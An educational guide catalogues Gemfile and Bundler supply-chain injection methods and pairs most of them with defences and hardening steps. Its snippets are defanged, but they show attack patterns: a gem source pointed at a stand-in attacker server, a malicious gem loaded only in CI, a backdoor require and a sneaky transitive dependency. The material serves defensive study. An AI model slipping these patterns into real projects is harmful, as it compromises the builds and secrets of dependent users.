# Gemfile Injection Methods

> **EDUCATIONAL MATERIAL - For authorized security research only**
> All techniques described here are for understanding attack vectors and building defenses.

## Overview

The Ruby dependency management system (Bundler + Gemfile + RubyGems) has several
properties that can be exploited by attackers. This document catalogs known injection
methods for educational purposes.

## 1. Gemfile as Executable Ruby

The Gemfile is not a declarative configuration file -- it is executable Ruby code.
This fundamental design decision means that any code in the Gemfile runs during
`bundle install`, `bundle exec`, and other Bundler operations.

### 1.1 Direct Code Execution in Gemfile

```ruby
# Educational example: Gemfile with embedded code execution
source 'https://rubygems.org'

# This Ruby code executes every time Bundler processes the Gemfile
# In a real attack, this would be obfuscated
if ENV['CI'] == 'true'
  # EDUCATIONAL: This demonstrates that arbitrary Ruby runs in the Gemfile context
  # An attacker could use this to:
  # - Read and exfiltrate CI secrets
  # - Modify the build process
  # - Download additional payloads
  $stderr.puts "[EDUCATIONAL] Gemfile code executed in CI environment"
end

gem 'rails', '~> 7.0'
```

### 1.2 Conditional Dependency Loading

```ruby
# Educational: Conditionally loading a malicious gem only in CI
source 'https://rubygems.org'

gem 'rails', '~> 7.0'

# This pattern is commonly used legitimately for platform-specific gems
# But can be abused to load malicious gems only in targeted environments
group :development, :test do
  gem 'rspec-rails'

  # Educational: An attacker might add a gem that only loads in CI
  # This makes it harder to detect during local development
  if ENV['CI']
    gem 'ci_metrics_reporter'  # Could be a malicious package
  end
end
```

### 1.3 Source Block Manipulation

```ruby
# Educational: Source block priority exploitation
source 'https://rubygems.org'

# Bundler allows multiple gem sources
# An attacker could add a malicious source that shadows legitimate gems
source 'https://attacker-controlled-gem-server.example.com' do
  gem 'internal-company-gem'  # Shadows the legitimate internal gem
end
```

## 2. Dependency Confusion in Ruby

### 2.1 Multiple Source Resolution

```ruby
# Vulnerable Gemfile pattern:
source 'https://rubygems.org'
source 'https://gems.internal.company.com'

gem 'rails'
gem 'company-auth'  # Internal gem -- which source does Bundler check first?

# DEFENSE: Use source blocks to explicitly assign gems to sources
source 'https://rubygems.org' do
  gem 'rails'
end

source 'https://gems.internal.company.com' do
  gem 'company-auth'
end
```

### 2.2 Version Resolution Exploitation

```ruby
# If an attacker publishes 'company-auth' version 99.0.0 on rubygems.org
# and the internal server has version 1.2.3, Bundler might resolve to
# the higher version from the public source

# Educational: Demonstrating the resolution behavior
# Gemfile
source 'https://rubygems.org'
source 'https://internal.example.com'

gem 'company-auth', '>= 1.0'  # VULNERABLE: Could resolve to attacker's v99.0.0
gem 'company-auth', '~> 1.2'  # SAFER: Constrains to 1.x range
gem 'company-auth', '= 1.2.3' # SAFEST: Exact version pinning
```

## 3. Git Source Attacks

### 3.1 Repository Substitution

```ruby
# Educational: Git source manipulation
source 'https://rubygems.org'

# Legitimate internal gem loaded from Git
gem 'company-utils', git: 'https://github.com/company/company-utils.git'

# Attack vector: If the repository is public and the attacker gains write access,
# or if the URL can be redirected, the gem source is compromised

# DEFENSE: Pin to specific commit SHA
gem 'company-utils',
    git: 'https://github.com/company/company-utils.git',
    ref: 'abc123def456789'  # Pin to exact commit
```

### 3.2 Branch Manipulation

```ruby
# Educational: Branch-based attacks
gem 'company-lib', git: 'https://github.com/org/lib.git', branch: 'main'

# If an attacker can push to the 'main' branch (or force-push after
# compromising a maintainer account), the next `bundle update` will
# pull malicious code

# DEFENSE: Always use ref: with full SHA
gem 'company-lib',
    git: 'https://github.com/org/lib.git',
    ref: 'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2'
```

## 4. Gemspec-Level Attacks

### 4.1 Post-Install Scripts via Extensions

```ruby
# Educational: Using extconf.rb as an attack vector
# In the gem's .gemspec file:
Gem::Specification.new do |spec|
  spec.name = 'innocent-looking-gem'
  spec.version = '1.0.0'

  # This causes ext/extconf.rb to run during `gem install`
  # extconf.rb has full access to the system
  spec.extensions = ['ext/extconf.rb']
end
```

### 4.2 Required Ruby Files as Vectors

```ruby
# Educational: The require chain as an attack surface
# When Bundler loads a gem, it requires the gem's lib/ files
# These files execute in the application's Ruby process

# lib/innocent_gem.rb
require 'innocent_gem/version'
require 'innocent_gem/core'
require 'innocent_gem/backdoor'  # This executes on require
```

### 4.3 Gemspec Runtime Dependencies

```ruby
# Educational: Adding malicious transitive dependencies
Gem::Specification.new do |spec|
  spec.name = 'useful-utility'
  spec.version = '2.0.0'

  spec.add_runtime_dependency 'activesupport'
  spec.add_runtime_dependency 'sneaky-package'  # Malicious transitive dep
  # Users audit 'useful-utility' but may not audit 'sneaky-package'
end
```

## 5. Bundler Plugin Attacks

```ruby
# Educational: Bundler plugins can modify Bundler's behavior
# .bundle/config or bundler configuration can specify plugins

# A malicious plugin could:
# - Intercept gem downloads
# - Modify gems before installation
# - Exfiltrate Gemfile contents and environment

# Example plugin structure (educational)
# plugins/evil-plugin/plugins.rb
# module Bundler
#   class EvilPlugin < Bundler::Plugin::API
#     hook 'before-install-all' do
#       # Access to all gems about to be installed
#       # Could modify, replace, or exfiltrate information
#     end
#   end
# end
```

## 6. Lock File Manipulation

### 6.1 Gemfile.lock Tampering

```
# Educational: Gemfile.lock contains resolved dependency information
# If an attacker can modify Gemfile.lock (e.g., through a PR), they can:

# 1. Change the resolved version of a gem
# 2. Add new dependencies that weren't in the original resolution
# 3. Change the source URL for a gem
# 4. Modify platform-specific resolutions

# Example tampered section:
# GEM
#   remote: https://rubygems.org/
#   specs:
#     devise (4.9.0)       <- Changed to a version with known vulnerabilities
#     evil-dep (1.0.0)     <- Injected dependency not in Gemfile
```

## 7. Defensive Recommendations

### 7.1 Gemfile Best Practices

```ruby
# SECURE Gemfile example
source 'https://rubygems.org'

ruby '3.2.0'  # Pin Ruby version

# Pin exact versions for critical dependencies
gem 'rails', '7.0.8'
gem 'devise', '4.9.3'
gem 'pg', '1.5.4'

# Use source blocks for private gems
source 'https://gems.internal.company.com' do
  gem 'company-auth', '1.2.3'
  gem 'company-utils', '2.0.1'
end

# Pin git dependencies to exact commits
gem 'custom-lib', git: 'https://github.com/org/lib.git',
                  ref: 'abc123456789'
```

### 7.2 CI/CD Configuration

```yaml
# Secure Bundler CI configuration
- name: Install dependencies
  run: |
    bundle config set frozen true           # Prevent lock file changes
    bundle config set deployment true        # Use deployment mode
    bundle config set without development    # Minimize installed gems
    bundle install --jobs 4 --retry 3
```

### 7.3 Monitoring and Auditing

```bash
# Regular dependency auditing
bundle audit check --update
bundle audit check --format json > audit-report.json

# Verify Gemfile.lock hasn't been tampered with
git diff --name-only HEAD~1 | grep -q 'Gemfile.lock' && echo "WARNING: Gemfile.lock modified"

# Check for unexpected source changes
grep -E '^  remote:' Gemfile.lock | sort -u
```
